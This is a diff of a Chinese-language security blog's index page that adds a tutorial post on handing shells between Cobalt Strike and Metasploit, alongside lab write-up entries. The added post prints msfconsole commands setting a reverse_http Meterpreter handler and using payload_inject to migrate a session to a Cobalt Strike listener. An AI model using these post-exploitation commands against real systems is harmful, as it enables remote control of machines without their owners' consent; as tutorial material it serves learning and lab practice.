@@ -75,6 +75,72 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-tools-cs-msf-exchange" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/17/tools-cs-msf-exchange/" class="article-date">
+  <time class="dt-published" datetime="2024-03-17T06:26:44.000Z" itemprop="datePublished">2024-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/17/tools-cs-msf-exchange/">tools_cs_msf_exchange</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CS-与-MSF-之间的联动"><a href="#CS-与-MSF-之间的联动" class="headerlink" title="CS 与 MSF 之间的联动"></a>CS 与 MSF 之间的联动</h1><h2 id="1-CS-shell-反弹到-MSF-上"><a href="#1-CS-shell-反弹到-MSF-上" class="headerlink" title="1. CS shell 反弹到 MSF 上"></a>1. CS shell 反弹到 MSF 上</h2><h3 id="1-1-CS-设置联动监听器"><a href="#1-1-CS-设置联动监听器" class="headerlink" title="1.1 CS 设置联动监听器"></a>1.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
+<p><img src="/images/image-20240317131321330.png" alt="image-20240317131321330"></p>
+<h3 id="1-2-MSF-设置联动监听器"><a href="#1-2-MSF-设置联动监听器" class="headerlink" title="1.2 MSF 设置联动监听器"></a>1.2 MSF 设置联动监听器</h3><p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
+<p><img src="/images/image-20240317131520192.png" alt="image-20240317131520192"></p>
+<h3 id="1-3-CS-反弹-shell-到-MSF"><a href="#1-3-CS-反弹-shell-到-MSF" class="headerlink" title="1.3 CS 反弹 shell 到 MSF"></a>1.3 CS 反弹 shell 到 MSF</h3><p>​	将会话迁移(spawn功能，可以使用命令行，也可以使用CS图形化界面默认功能迁移)到刚刚在CS上建立的监听器上</p>
+<p>​	<img src="/images/image-20240317140306170.png" alt="image-20240317140306170"></p>
+<p>​	成功获取到监听会话</p>
+<p><img src="/images/image-20240317131457292.png" alt="image-20240317131457292"></p>
+<h2 id="2-MSF-shell-反弹到-CS-上"><a href="#2-MSF-shell-反弹到-CS-上" class="headerlink" title="2. MSF shell 反弹到 CS 上"></a>2. MSF shell 反弹到 CS 上</h2><h3 id="2-1-CS-设置联动监听器"><a href="#2-1-CS-设置联动监听器" class="headerlink" title="2.1 CS 设置联动监听器"></a>2.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
+<p><img src="/images/image-20240317140723324.png" alt="image-20240317140723324"></p>
+<h3 id="2-2-MSF-设置联动监听器"><a href="#2-2-MSF-设置联动监听器" class="headerlink" title="2.2 MSF 设置联动监听器"></a>2.2 MSF 设置联动监听器</h3><p>​	首先选择当前需要联动的sessions</p>
+<blockquote>
+<h4 id="查看所有会话"><a href="#查看所有会话" class="headerlink" title="查看所有会话"></a>查看所有会话</h4><p>sessions</p>
+</blockquote>
+<p>​	这里尝试将session 3 进行迁移</p>
+<p><img src="/images/image-20240317134605959.png" alt="image-20240317134605959">	</p>
+<p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lport 8080  </span><br><span class="line">lport =&gt; 80800</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf6 &gt; run </span><br></pre></td></tr></table></figure>
+
+<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
+<p><img src="/images/image-20240317140910941.png" alt="image-20240317140910941"></p>
+<h3 id="1-3-MSF-反弹-shell-到-CS"><a href="#1-3-MSF-反弹-shell-到-CS" class="headerlink" title="1.3 MSF 反弹 shell 到 CS"></a>1.3 MSF 反弹 shell 到 CS</h3><p>​	在配置完 MSF 反弹shell参数后直接运行，过会儿就能在 CS 界面上看到上线的会话了(默认上线是启动的notepad,exe)</p>
+<p><img src="/images/image-20240317135236135.png" alt="image-20240317135236135"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="cltv4z1jw0003ldvdbgxffxzd" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-protocol-arp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/15/protocol-arp/" class="article-date">
@@ -187,7 +253,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="cltsany9i0001rbvd6hkz2ja9" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="cltv4z1jq0001ldvdgyxeb4fn" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -334,7 +400,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="cltsany9m0003rbvd85ww9j18" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="cltv4z1k20005ldvdeidwbt3n" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -395,7 +461,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="cltsany9q0006rbvdf2vh1vvq" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="cltv4z1k40007ldvdejhdc0da" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -544,7 +610,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="cltsany9r0007rbvd9l33gpkd" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="cltv4z1k6000aldvdhzvu3z46" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -664,7 +730,7 @@
 <p><img src="/images/image-20230317151548630.png" alt="image-20230317151548630"></p>
 <p>​		尝试使用上面的用户名和密码进行SSH链接</p>
 <blockquote>
-<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#x64;&#115;&#116;&#101;&#118;&#101;&#x6e;&#x73;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x33;&#52;&#x2e;&#x31;&#51;&#54;">&#x64;&#115;&#116;&#101;&#118;&#101;&#x6e;&#x73;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x33;&#52;&#x2e;&#x31;&#51;&#54;</a></p>
+<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#x64;&#x73;&#x74;&#x65;&#x76;&#x65;&#x6e;&#115;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#51;&#52;&#46;&#x31;&#51;&#54;">&#x64;&#x73;&#x74;&#x65;&#x76;&#x65;&#x6e;&#115;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#51;&#52;&#46;&#x31;&#51;&#54;</a></p>
 </blockquote>
 <p><img src="/images/image-20230317144444254.png" alt="image-20230317144444254"></p>
 <p>​		成功连接上主机，可以发现我们是一个低权限账号，下面我们就该提权限了</p>
@@ -681,7 +747,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="cltsany9p0005rbvd9kmybgmz" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="cltv4z1k30006ldvdhyzc8saa" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -718,7 +784,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 20px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
+      <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 20px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
     </div>
   </div>
 
@@ -740,6 +806,10 @@
       <ul>
         
           <li>
+            <a href="/2024/03/17/tools-cs-msf-exchange/">tools_cs_msf_exchange</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/15/protocol-arp/">protocol-arp</a>
           </li>
         
@@ -753,10 +823,6 @@
         
           <li>
             <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/">vulnhub-LAMPSecurity-CTF5.md</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/">vulnhub-LAMPSecurity-CTF4.md</a>
           </li>
         
       </ul>
